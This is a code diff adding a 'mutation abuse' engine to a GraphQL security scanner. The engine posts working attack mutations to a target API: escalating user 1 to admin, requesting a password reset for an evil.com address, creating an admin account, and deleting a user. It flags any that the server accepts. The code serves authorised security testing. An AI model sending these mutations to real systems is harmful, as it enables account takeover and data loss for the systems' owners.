@@ -303,4 +303,56 @@ class GraphQLScanner:
                 logger.debug(f"variant failed, continuing: {exc}")
                 continue
 
+        # ── Engine 6: Mutation abuse ─────────────────────────────────
+        # (name, query, severity, confidence). A 200 with data and no
+        # errors means the mutation was ACCEPTED — the actual effect
+        # (role change, deletion) must be confirmed by the operator.
+        # Deletion targets a nonexistent id and creation uses an
+        # identifiable test address to minimise collateral damage.
+        mutation_payloads = [
+            ("role_escalation",
+             'mutation{updateUser(id:1,role:"admin"){id role}}',
+             Severity.CRITICAL, 0.7),
+            ("password_reset",
+             'mutation{resetPassword(email:"admin@evil.com"){token}}',
+             Severity.CRITICAL, 0.6),
+            ("user_creation",
+             'mutation{createUser(email:"titan_scan_test@invalid.local",password:"Tt5n$9xQz",role:"admin"){id}}',
+             Severity.CRITICAL, 0.7),
+            ("data_deletion",
+             "mutation{deleteUser(id:999999){success}}",
+             Severity.CRITICAL, 0.6),
+        ]
+        for name, query, sev, conf in mutation_payloads:
+            try:
+                resp = await context.request.post(
+                    api_url,
+                    data=json.dumps({"query": query}),
+                    headers={"Content-Type": "application/json", "Referer": target},
+                    timeout=10000,
+                )
+                body = await resp.text()
+                accepted = resp.status == 200 and '"data"' in body and '"errors"' not in body
+                if accepted:
+                    findings.append(Finding(
+                        target=target,
+                        url=api_url,
+                        method="POST",
+                        param="mutation",
+                        location="body",
+                        payload=f"GraphQL mutation abuse: {name}",
+                        attack_type=AttackType.BUSINESS_LOGIC,
+                        severity=sev,
+                        verified=False,
+                        confidence=conf,
+                        status=resp.status,
+                        headers=dict(resp.headers),
+                        body=body[:2000],
+                        diffs=[f"graphql:{name}"],
+                        notes="mutation accepted without error — confirm real-world effect manually",
+                    ))
+            except Exception as exc:
+                logger.debug(f"variant failed, continuing: {exc}")
+                continue
+
         return findings
